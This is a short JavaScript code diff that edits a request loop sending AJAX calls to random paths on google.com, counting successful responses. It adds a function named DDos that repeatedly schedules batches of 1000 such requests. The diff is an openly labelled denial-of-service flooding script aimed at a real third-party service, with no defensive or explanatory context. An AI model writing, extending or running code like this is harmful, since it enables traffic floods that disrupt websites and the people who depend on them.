@@ -18,12 +18,22 @@ function make_request(n) {
         url: "https://www.google.com/" + makeid(10),
       },
       success: function (data, textStatus) {
-        console.log(data);
+        ++count;
       },
       fail: function (xhr, textStatus, errorThrown) {
         console.log(errorThrown);
       },
     });
-    //console.log(count);
+    console.log(count);
   }
+}
+function DDos(n) {
+  for (let i=0; i<n; i++) {
+    task();
+ }
+}
+function task() {
+  setTimeout(function() {
+      make_request(1000);
+  }, 1000);
 }
